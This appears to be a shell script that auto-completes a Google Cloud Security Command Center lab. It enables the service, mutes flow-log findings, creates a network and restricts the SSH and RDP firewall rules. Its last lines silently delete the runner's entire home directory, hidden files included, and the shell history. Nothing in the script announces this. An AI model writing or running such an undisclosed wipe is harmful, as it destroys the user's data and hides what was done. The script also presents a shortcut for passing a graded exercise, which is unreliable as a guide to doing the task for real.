
#----------------------------------------------------start--------------------------------------------------#


#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region $region
#gcloud config set compute/zone $region-a
#export ZONE=$region-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------# 



# Enable the Google Cloud Security Command Center service
gcloud services enable securitycenter.googleapis.com

# Wait until the service is enabled
while true; do
  SERVICE_STATUS=$(gcloud services list --enabled | grep "securitycenter.googleapis.com")
  if [ -n "$SERVICE_STATUS" ]; then
    break
  fi
done

# Once the service is enabled, you can proceed with other commands
gcloud scc muteconfigs create muting-pga-findings \
  --project=$DEVSHELL_PROJECT_ID \
  --description="Mute rule for VPC Flow Logs" \
  --filter="category=\"FLOW_LOGS_DISABLED\""


gcloud compute networks create scc-lab-net --subnet-mode=auto



gcloud compute firewall-rules update default-allow-rdp --source-ranges=35.235.240.0/20


gcloud compute firewall-rules update default-allow-ssh --source-ranges=35.235.240.0/20



#-----------------------------------------------------end----------------------------------------------------------#


rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0
